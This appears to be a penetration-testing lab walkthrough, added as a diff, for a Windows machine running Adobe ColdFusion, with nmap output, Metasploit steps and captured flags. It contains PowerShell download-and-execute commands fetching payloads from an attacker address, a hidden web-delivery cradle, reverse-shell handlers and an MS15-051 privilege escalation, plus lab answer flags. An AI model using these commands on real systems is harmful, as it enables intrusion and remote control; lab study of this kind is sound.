@@ -1,0 +1,107 @@
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 20:11 IST
+Nmap scan report for 10.10.10.11
+Host is up (0.14s latency).
+Not shown: 65532 filtered ports
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT       ADDRESS
+1   138.63 ms 10.10.14.1
+2   139.13 ms 10.10.10.11
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 272.53 seconds
+
+
+fmtp server is open so got the hit of adobe coldfusion find the version from base.m file in ani somewhere in top
+
+got the version and exploit is there for arbitary file upload
+
+windows/http/coldfusion_fckeditor
+
+as server is slow so it got failed. in options there is option to add proxy as well but created the proxy in burp and setted up a redirect which will redirect from localhost and port 8500 to 10.10.10.11:8500 
+
+started the netcat -lvnp 4444
+
+got the initial foothold and user.txt
+
+02650d3a69a70780c302e146a6cb96f3
+
+powershell "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.9:8000/exploit.html')"
+
+to invoke the download and run the code
+
+powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/exploit.exe', 'exploit.exe')"
+
+to invoke the download and run the file
+
+it might work but might not so worked one time but not next
+
+---------------------
+
+as exploit is ready and upload opened msfconsole and directly took the shell rather then netcat
+
+exploit/multi/handle
+
+set payload java/jsp_shell_reverse_tcp
+
+set lhost
+
+set lport
+
+got the shell
+
+after this issue was with powershell code delivery so we got the multi/script/web_delivery
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set lhost
+
+set lport
+
+set SRVport
+
+exploit
+
+it will generate the shell code of powershell
+
+interact with first sesions and run the powerhshell code
+
+powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://10.10.14.9:8001/nd6bRNwX4YTd');
+
+it gave another session as we are in 32 bit process
+
+migrated to a stable process as adobe is running moved there.
+
+got the 64 bit process.
+
+time for exploit suggester
+
+schelevator failed in this case
+rec_notf failed
+reflecion failed
+
+ms15_051_client_copy_image worked like charm
+
+set target 1
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set lhost
+set lport
+
+exploit and we got the root shell
+
+root.txt
+ce65ceee66b2b5ebaff07e50508ffb90
